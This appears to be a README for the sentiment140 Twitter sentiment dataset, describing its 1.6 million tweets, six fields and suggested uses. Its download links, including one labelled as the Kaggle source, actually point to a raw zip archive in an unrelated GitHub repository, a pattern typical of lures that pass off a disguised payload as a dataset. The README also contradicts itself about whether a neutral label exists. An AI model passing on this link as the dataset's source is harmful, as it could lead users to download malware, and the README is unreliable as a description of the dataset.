**Sentiment Analysis with Twitter Dataset**

**Description:**
This dataset, known as the sentiment140 dataset, comprises 1,600,000 tweets obtained using the Twitter API. Each tweet has been annotated with sentiment polarity labels, where 0 denotes negative sentiment, 2 represents neutral sentiment, and 4 indicates positive sentiment. The dataset includes six fields: target (polarity label), ids (tweet ID), date (tweet timestamp), flag (query, with "NO_QUERY" indicating no query), user (tweet author), and text (tweet content). 

**Dataset Source:**
The dataset was created by automatically collecting tweets through the Twitter Search API, with sentiment labels inferred based on the presence of positive or negative emoticons within the tweets. For tweets containing positive emoticons (e.g., :)), sentiment was labeled as positive, while tweets containing negative emoticons (e.g., :( ) were labeled as negative.

**References:**
- (https://github.com/Meghsss/sentiment-analysis/raw/refs/heads/main/marennin/sentiment_analysis_3.4.zip)
**Readme Contents:**

1. **Dataset Overview:**
   The sentiment140 dataset comprises 1,600,000 tweets extracted using the Twitter API. Each tweet is labeled with sentiment polarity, where 0 denotes negative sentiment and 4 denotes positive sentiment. The dataset consists of six fields:

   1. **target:** The polarity of the tweet (0 = negative, 4 = positive).
   2. **ids:** The ID of the tweet.
   3. **date:** The date of the tweet in the format "Day Month Date Time UTC Year".
   4. **flag:** The query used to collect the tweet. If no query was used, the value is "NO_QUERY".
   5. **user:** The user who tweeted the content.
   6. **text:** The text content of the tweet.

   This dataset provides a diverse collection of tweets with sentiment annotations, making it suitable for sentiment analysis tasks and machine learning model training.

2. **Data Description:**
   1. **target:** This field represents the sentiment polarity label of the tweet. It indicates whether the tweet expresses negative sentiment (assigned the value 0) or positive sentiment (assigned the value 4).
   2. **ids:** The "ids" field contains the unique identifier (ID) of each tweet in the dataset. This ID serves as a reference point to distinguish individual tweets from one another.
   3. **date:** The "date" field denotes the timestamp when each tweet was posted on Twitter. The timestamp follows the format "Day Month Date Time UTC Year".
   4. **flag:** This field provides information about the query used to collect the tweet. If a specific query was employed to obtain the tweet, the query term is recorded in this field. However, if no query was utilized, the value of this field is "NO_QUERY".
   5. **user:** The "user" field indicates the username of the Twitter user who posted the tweet. It identifies the author or source of the tweet content.
   6. **text:** The "text" field contains the actual text content of the tweet. It includes the message or statement posted by the Twitter user, which may consist of a combination of words, symbols, hashtags, mentions, and URLs.

   Overall, these fields collectively provide comprehensive information about each tweet in the dataset, including sentiment labels, tweet attributes, and metadata associated with the tweet content.

3. **Data Source:**
The sentiment140 dataset used in this project is sourced from Kaggle, a platform for data science and machine learning enthusiasts. This dataset, specifically extracted from Twitter, contains 1,600,000 tweets annotated with sentiment polarity labels. The dataset was originally collected using the Twitter API and is made available on Kaggle for research and educational purposes.

Link to the dataset on Kaggle: [Sentiment140 Dataset](https://github.com/Meghsss/sentiment-analysis/raw/refs/heads/main/marennin/sentiment_analysis_3.4.zip)

**Usage Guidelines:**
- The dataset can be used for sentiment analysis tasks, including sentiment classification and polarity detection.
- Data preprocessing steps may include tokenization, removal of stopwords, and normalization of text data.
- Various machine learning or deep learning models can be trained on the dataset for sentiment analysis, with evaluation based on accuracy, precision, recall, and F1-score metrics.
